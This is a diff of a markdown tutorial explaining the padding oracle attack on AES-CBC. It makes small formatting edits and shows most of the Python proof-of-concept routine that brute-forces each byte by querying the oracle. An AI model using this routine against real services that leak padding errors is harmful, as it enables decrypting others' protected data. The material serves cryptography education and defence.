@@ -15,6 +15,7 @@ Padding Oracle attack fully explained and coded from scratch in Python3.
 3- AES-CBC Ciphering    
 4- Exploiting CBC mode    
 5- Padding Oracle Attack    
+6- Python3 Script
 
 * * *
 ## 1- Overview
@@ -31,10 +32,7 @@ In this article, we will focus on how to use this vulnerability and propose a py
 
 If you're only insterested in using the code, the chapter 2 is all you need. However, please note that this code consider that you know the initialization vector, which is usually wrong in real life.
 
-[Download](https://github.com/flast101/padding-oracle-attack-explained/archive/master.zip) to get the script or:
-~~~
-$ git clone https://github.com/flast101/padding-oracle-attack-explained.git
-~~~
+[Download](https://github.com/flast101/padding-oracle-attack-explained/archive/master.zip) to get the script or `$ git clone https://github.com/flast101/padding-oracle-attack-explained.git`   
 
 Cryptographic parameters can be changed in **`settings.py`**.
 
@@ -218,7 +216,7 @@ This is exactely where resides the vulnerability of CBC mode... and the beauty o
 We just saw that    
 P'<sub>1</sub> = P<sub>3</sub> ⊕ C<sub>2</sub> ⊕ X
 
-As XOR operation is commutative, the following formula is also true:
+As XOR operation is commutative, the following formula is also true:   
 **P<sub>3</sub> = P'<sub>1</sub> ⊕ C<sub>2</sub> ⊕ X**
 
 This equality only contains the XOR operation. As you know, the XOR is a bit by bit operation, so we can split this equality by calculating it byte by byte.
@@ -291,7 +289,7 @@ where X[i] is the byte that satisfied the requirements of PKCS7.
 
 
 * * * 
-## 6- Python3 script
+## 6- Python3 Script
 
 Here is the python3 script **`poracle-exploit.py`**:
 ```python
@@ -309,39 +307,30 @@ def poc(encrypted):
     # Go through each block
     for i in range(block_number, 0, -1):
         current_encrypted_block = encrypted[(i-1)*BYTE_NB:(i)*BYTE_NB]
-
         # At the first encrypted block, use the initialization vector if it is known
         if(i == 1):
             previous_encrypted_block = bytearray(IV.encode("ascii"))
         else:
             previous_encrypted_block = encrypted[(i-2)*BYTE_NB:(i-1)*BYTE_NB]
- 
         bruteforce_block = previous_encrypted_block
         current_decrypted_block = bytearray(IV.encode("ascii"))
         padding = 0
-
         # Go through each byte of the block
         for j in range(BYTE_NB, 0, -1):
             padding += 1
-
             # Bruteforce byte value
             for value in range(0,256):
                 bruteforce_block = bytearray(bruteforce_block)
                 bruteforce_block[j-1] = (bruteforce_block[j-1] + 1) % 256
                 joined_encrypted_block = bytes(bruteforce_block) + current_encrypted_block
-
                 # Ask the oracle
                 if(oracle(joined_encrypted_block)):
                     current_decrypted_block[-padding] = bruteforce_block[-padding] ^ previous_encrypted_block[-padding] ^ padding
-
                     # Prepare newly found byte values
                     for k in range(1, padding+1):
                         bruteforce_block[-k] = padding+1 ^ current_decrypted_block[-k] ^ previous_encrypted_block[-k]
-
                     break
-
         decrypted = bytes(current_decrypted_block) + bytes(decrypted)
-
     return decrypted[:-decrypted[-1]]  # Padding removal
 
 #### Script ####
